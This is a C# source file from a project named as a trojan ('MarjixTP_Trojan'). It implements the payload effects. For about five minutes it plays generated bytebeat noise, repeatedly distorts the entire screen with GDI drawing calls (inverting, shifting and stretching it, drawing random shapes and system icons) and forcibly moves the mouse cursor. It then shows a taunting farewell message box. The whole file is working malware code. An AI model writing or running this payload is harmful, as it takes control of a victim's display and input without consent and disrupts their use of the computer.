using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Media;
using System.Linq.Expressions;
using System.Diagnostics.Eventing.Reader;
using System.Security.Principal;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Configuration;
using static MarjixTP_Trojan.DllImports;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TextBox;
using System.Drawing.Drawing2D;

namespace MarjixTP_Trojan
{
    public static class FX
    {
        private static int currentMode = 0;
        private static bool ending = false;
        private static int time = 30;
        private static SoundPlayer soundP;

        private static void ByteBeat(int currentBeat, int freq, bool stop)
        {
            if (stop)
            {
                if (soundP != null)
                {
                    soundP.Stop();
                }
            }
            else
            {
                using (var stream = new MemoryStream())
                {
                    var writer = new BinaryWriter(stream);

                    writer.Write("RIFF".ToCharArray());  // chunk id
                    writer.Write((UInt32)0);             // chunk size
                    writer.Write("WAVE".ToCharArray());  // format

                    writer.Write("fmt ".ToCharArray());  // chunk id
                    writer.Write((UInt32)16);            // chunk size
                    writer.Write((UInt16)1);             // audio format

                    var channels = 1;
                    var sample_rate = freq;
                    var bits_per_sample = 8;

                    writer.Write((UInt16)channels);
                    writer.Write((UInt32)sample_rate);
                    writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                    writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                    writer.Write((UInt16)bits_per_sample);

                    writer.Write("data".ToCharArray());

                    var seconds = 30;

                    var data = new byte[sample_rate * seconds];

                    switch (currentBeat)
                    {
                        case 0:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((byte)((t & t * 5 | t >> 6 | ((t & 0xFFFF) > 0x8000 ? (-6 * t) / 7 : ((t & 0x1FFFF) > 0x10000 ? -9 * t & 100 : (-9 * (t & 100))) / 11)) * 10));
                            break;
                        case 1:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * (((t & 4096) != 0 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & -t >> ((t & 2048) != 0 ? 2 : 10)));
                            break;
                        case 2:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t / 8 >> (t >> 9) * t / ((t >> 14 & 3) + 4));
                            break;
                        case 3:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(((10 * (t >> 6 | t | t >> (t >> 16 & 3)) + (7 & t >> 11)) % 256 * ((t & 3072) != 0 ? (2048 + t % 4096) % 3072 / 12 : 0) >> 8) + ((t & 3072) != 0 ? 0 : (t % 256 * (1024 - t % 1024) / 3 >> 6 & 128) >> (t >> 8 & 15)));
                            break;
                        case 4:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t + (t & t ^ t >> 6) - t * (t >> 9 & ((t % 16) != 0 ? 2 : 6) & t >> 9));
                            break;
                        case 5:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(((((t * ((t & 16384) != 0 ? 7 : 5) * (3 - (3 & (t >> 9)) + (3 & (t >> (((-t >> 20) & 1) != 0 ? 8 : 11)))) >> (3 & (-t >> ((t & ((-t & 57344) != 0 ? 4096 : 6144)) != 0 ? 2 : 16)))) | (((-t & 24576) != 0) ? ((3 * t >> 5) % 192) : ((t >> 4) % 192)) | (((t >> 20) & 1) != 0 ? (t >> 4) : (t >> (((-t >> 18) & 1) + 2)))) & 255) >> 1) - ((((t >> 18) & 1) != 0) ? ((((-t >> 1) * ((t & 16384) != 0 ? 7 : 5)) >> ((-t >> 10) & 3) & (t >> 4 & 255)) >> 1) : (((-t >> 2) * ((t & 16384) != 0 ? 7 : 5)) >> ((-t >> 10) & 3) & ((t >> 4 & 255) >> 1))) + (128 & (int)(40000 / (1 + (t & (((-t & 28672) != 0) ? 4095 : 2047))))) + ((((t >> 18) & 3) != 0) ? -(((t * (t ^ (t % 9))) & 255 & -(Convert.ToInt32((t >> ((t >> 11) & 31)) != 0 ? ((-t & 14336) != 0 ? 5 : 4) - Convert.ToInt32((-t & 28672) == 0) - Convert.ToInt32((-t & 122880) == 0) : 6)) << 2 & 255) >> 2) + 128 : 0));
                            break;
                        case 6:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * (-t >> (((t >> 13) % 8) + 2) & ((t >> 12) % 256)) / 4 + ((1048576 / ((t % 65536) | 1)) & 128));
                            break;
                        case 7:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((((t >> 5 | t >> 4 | (t % 42 * (t >> 4) | 357052691 - (t >> 4)) / ((t >> 16) | 1) ^ (t | t >> 4)) & 255) + ((t % 25 - (t >> 2 | ((t & 16384) != 0 ? 64 / 3 : 16) * t | t % 227) - t >> 3 | (t >> 5 & 1663 * (t << 5) | (t >> 3) % 1544) / ((t % 17 | t % 2048) | 1)) & 255) + 100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)) % 256) / 3);
                            break;
                        case 8:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * t * 4 / (((5656 >> (t >> 12 & 14)) & 7) + 9) * (t >> 10 & 893) & t >> 4 ^ (((t >> 16 & 1) != 0 ? 0 : (t >> 10 & -t >> 14 & 3)) | (((t >> 9 & 1) + (t >> 12 & 7)) != 0 ? 0 : ((t % 4096) != 0 && (t / 9 & 8) == 0 ? 9001 / (t % 4096) : -1))));
                            break;
                        case 10:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((t >> (t >> 13 & 31) & 128) + ((t & t >> 12) * t >> 12) + 3e5 / (t % 16384));
                            break;
                    }

                    writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                    foreach (var elt in data) writer.Write(elt);

                    writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                    writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                    stream.Seek(0, SeekOrigin.Begin);

                    soundP = new SoundPlayer(stream);
                    soundP.Play();
                }
            }
        }

        private static void MTPEndPart()
        {
            MessageBox.Show("Alright, I'm done now. I must go, use your computer wisely. Peace out!!", "Thanks for using again!!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private static void ModeTypes()
        {
            while (!ending)
            {
                switch (currentMode)
                {
                    case 0:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 1:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 2:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 3:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 4:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 5:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 6:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 7:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 8:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 9:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 10:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    default:
                        ending = true;
                        break;
                }
            }
        }

        public static void MTPMain()
        {
            Thread.Sleep(800);

            Task.Run(ModeTypes);

            int currentByteBeat = -1;

            Task.Run(() =>
            {
                while (true)
                {
                    if (currentByteBeat != currentMode)
                    {
                        currentByteBeat = currentMode;
                        ByteBeat(0, 0, true);
                        switch (currentByteBeat)
                        {
                            case 0:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 1:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 2:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 3:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 4:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 5:
                                ByteBeat(currentByteBeat, 11025, false);
                                break;
                            case 6:
                                ByteBeat(currentByteBeat, 44100, false);
                                break;
                            case 7:
                                ByteBeat(currentByteBeat, 9500, false);
                                break;
                            case 8:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 9:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 10:
                                ByteBeat(currentByteBeat, 44100, false);
                                break;
                        }
                    }
                }
            });

            int x = 0, y = 0;
            foreach (var screen in Screen.AllScreens)
            {
                x += screen.Bounds.Width;
                y += screen.WorkingArea.Height;
            }
            Random r = new Random();
            int case4Up = 0, case4Down = y, case4Left = 0, case4Right = x;
            while (!ending)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr Brush = CreateSolidBrush(0xFFFFFF);
                switch (currentMode)
                {
                    case 0:
                        SelectObject(hdc, Brush);
                        PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                        BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-10, 10), r.Next(-25, 25), TernaryRasterOperations.SRCCOPY);
                        DeleteObject(Brush);
                        DeleteDC(hdc);
                        SetCursorPos(r.Next(0, x), r.Next(0, y));
                        Thread.Sleep(5);
                        break;
                    case 1:
                        SelectObject(hdc, Brush);
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x - 4, y + 3, TernaryRasterOperations.SRCCOPY);
                        DeleteObject(Brush);
                        DeleteDC(hdc);
                        SetCursorPos(Cursor.Position.X + r.Next(-25, 25), Cursor.Position.Y + r.Next(-25, 25));
                        Thread.Sleep(3);
                        break;
                    case 2:
                        SelectObject(hdc, Brush);
                        BitBlt(hdc, 0, 0, x, y, hdc, 0, -10, TernaryRasterOperations.SRCCOPY);
                        DeleteObject(Brush);
                        DeleteDC(hdc);
                        SetCursorPos(Cursor.Position.X, Cursor.Position.Y + 10);
                        Thread.Sleep(1);
                        break;
                    case 3:
                        int re = r.Next(0, 255), gr = r.Next(0, 255), bl = r.Next(0, 255);
                        uint brushColor = (uint)((bl << 16) | (gr << 8) | re);
                        IntPtr BrushCase3 = CreateSolidBrush(brushColor);
                        SelectObject(hdc, BrushCase3);
                        Ellipse(hdc, r.Next(0, x), r.Next(0, y), r.Next(0, x), r.Next(0, y));
                        DeleteObject(BrushCase3);
                        DeleteDC(hdc);
                        SetCursorPos(0, 0);
                        Thread.Sleep(15);
                        break;
                    case 4:
                        int re1 = r.Next(0, 255), gr1 = r.Next(0, 255), bl1 = r.Next(0, 255);
                        uint brushColor1 = (uint)((bl1 << 16) | (gr1 << 8) | re1);
                        IntPtr BrushCase4 = CreateSolidBrush(brushColor1);
                        if (case4Up <= y)
                        {
                            case4Up += 8;
                        }
                        else
                        {
                            case4Up = 0;
                        }
                        if (case4Left <= x)
                        {
                            case4Left += 8;
                        }
                        else
                        {
                            case4Left = 0;
                        }
                        if (case4Down >= 0)
                        {
                            case4Down -= 8;
                        }
                        else
                        {
                            case4Down = y;
                        }
                        if (case4Right >= 0)
                        {
                            case4Right -= 8;
                        }
                        else
                        {
                            case4Right = x;
                        }
                        SelectObject(hdc, BrushCase4);
                        Rectangle(hdc, case4Left, case4Up, case4Right, case4Down);
                        DeleteObject(BrushCase4);
                        DeleteDC(hdc);
                        SetCursorPos(case4Right, case4Down);
                        break;
                    case 5:
                        Icon icon = null;
                        switch (r.Next(0, 1))
                        {
                            case 0:
                                icon = ExtractIcon("shell32.dll", r.Next(0, 328), true);
                                break;
                            case 1:
                                icon = ExtractIcon("imageres.dll", r.Next(0, 402), true);
                                break;

                        }
                        Bitmap bmp = icon.ToBitmap();
                        IntPtr screenDC = GetDC(IntPtr.Zero);
                        IntPtr memDC = CreateCompatibleDC(screenDC);
                        IntPtr hBitmap = bmp.GetHbitmap();
                        IntPtr oldBmp = SelectObject(memDC, hBitmap);
                        int x1 = r.Next(0, x), y1 = r.Next(0, y), sx = bmp.Width * r.Next(0, x) / 5, sy = bmp.Height * r.Next(0, y) / 5;
                        StretchBlt(screenDC, x1, y1, sx, sy, memDC, 0, 0, x, y, TernaryRasterOperations.SRCPAINT);
                        SelectObject(memDC, oldBmp);
                        DeleteObject(hBitmap);
                        DeleteDC(memDC);
                        ReleaseDC(IntPtr.Zero, screenDC);
                        SetCursorPos(x1, y1);
                        break;
                    case 6:
                        SelectObject(hdc, Brush);
                        BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-80, 80), r.Next(-80, 80), TernaryRasterOperations.SRCCOPY);
                        DeleteObject(Brush);
                        DeleteDC(hdc);
                        SetCursorPos(r.Next(0, x), r.Next(0, y));
                        break;
                    case 7:
                        IntPtr hdc2 = CreateCompatibleDC(hdc);
                        IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
                        IntPtr selc = SelectObject(hdc2, hbit);
                        Rectangle(hdc, r.Next(0, x), r.Next(0, y), r.Next(0, x), r.Next(0, y));
                        BitBlt(hdc2, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                        AlphaBlend(hdc, r.Next(-50, 50), r.Next(-50, 50), x, y, hdc2, 0, 0, x, y, new BLENDFUNCTION(0, 0, 50, 0));
                        SelectObject(hdc2, selc);
                        DeleteObject(selc);
                        DeleteObject(hbit);
                        DeleteDC(hdc);
                        DeleteDC(hdc2);
                        SetCursorPos(x / 2, Cursor.Position.Y);
                        Thread.Sleep(2);
                        break;
                    case 8:
                        int re2 = r.Next(0, 255), gr2 = r.Next(0, 255), bl2 = r.Next(0, 255);
                        uint brushColor2 = (uint)((bl2 << 16) | (gr2 << 8) | re2);
                        IntPtr BrushCase8 = CreateSolidBrush(brushColor2);
                        SelectObject(hdc, BrushCase8);
                        BitBlt(hdc, 0, 0, x, y, hdc, x, y, TernaryRasterOperations.PATPAINT);
                        SetCursorPos(Cursor.Position.Y, Cursor.Position.X);
                        Thread.Sleep(2);
                        break;
                    case 9:
                        SetCursorPos(Cursor.Position.Y, Cursor.Position.X);
                        Thread.Sleep(2);
                        break;
                    case 10:
                        IntPtr hdc22 = CreateCompatibleDC(hdc);
                        IntPtr hbit2 = CreateCompatibleBitmap(hdc, x, y);
                        IntPtr selc2 = SelectObject(hdc22, hbit2);
                        Rectangle(hdc, r.Next(0, x), r.Next(0, y), r.Next(0, x), r.Next(0, y));
                        BitBlt(hdc22, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                        AlphaBlend(hdc, r.Next(-50, 50), r.Next(-50, 50), x, y, hdc22, 0, 0, x, y, new BLENDFUNCTION(0, 0, 50, 0));
                        SelectObject(hdc22, selc2);
                        DeleteObject(selc2);
                        DeleteObject(hbit2);
                        DeleteDC(hdc);
                        DeleteDC(hdc22);
                        SetCursorPos(x / 2, Cursor.Position.Y);
                        Thread.Sleep(2);
                        break;
                }
            }
            ByteBeat(0, 0, true);

            Thread.Sleep(800);

            MTPEndPart();
        }
    }
}